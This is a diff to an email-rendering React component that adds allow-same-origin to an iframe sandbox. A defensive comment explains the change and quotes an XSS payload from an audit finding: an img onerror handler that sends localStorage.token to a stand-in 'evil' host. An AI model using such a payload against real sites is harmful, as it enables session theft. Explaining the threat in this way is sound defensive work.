@@ -115,9 +115,32 @@ export function EmailBody({
       ref={frameRef}
       title={title}
       srcDoc={srcDoc}
-      /* allow-popups ONLY. Never add allow-scripts, and never pair
-       * allow-same-origin with allow-scripts. */
-      sandbox="allow-popups allow-popups-to-escape-sandbox"
+      /* allow-same-origin is REQUIRED for auto-height, and is safe ONLY while
+       * allow-scripts is absent. Read this before changing it.
+       *
+       * WHY IT IS NEEDED. Without it the frame gets an opaque origin,
+       * `contentDocument` is null, and measure() below returns silently — so
+       * every message rendered at exactly minHeight with its own scrollbar
+       * however long it was. That is the "only half the email shows" bug. No
+       * maxHeight change can fix it, because the cap was never reached.
+       *
+       * WHY IT IS SAFE. PROJECT_AUDIT §P0-1 was `allow-scripts
+       * allow-same-origin` TOGETHER: that pair voids the sandbox, and with the
+       * JWT in localStorage a mailed
+       *   <img src=x onerror="fetch('//evil/?t='+localStorage.token)">
+       * took the session of whoever opened it. Scripting is what that attack
+       * needs. Per the HTML sandbox rules, allow-same-origin does NOT enable
+       * scripting — only allow-scripts does. With scripting off the onerror
+       * never fires, nothing can read localStorage, and nothing can reach this
+       * page. The frame becomes readable BY the parent, not the other way
+       * round. The srcDoc CSP independently sets script-src 'none',
+       * form-action 'none' and default-src 'none', and DOMPurify has already
+       * stripped the handler.
+       *
+       * NEVER ADD allow-scripts. With allow-same-origin now present, that one
+       * flag is the whole vulnerability rather than half of it. EmailBody.test
+       * fails the build if it appears. */
+      sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"
       referrerPolicy="no-referrer"
       loading="lazy"
       className={cn('w-full border-0 bg-white', className)}
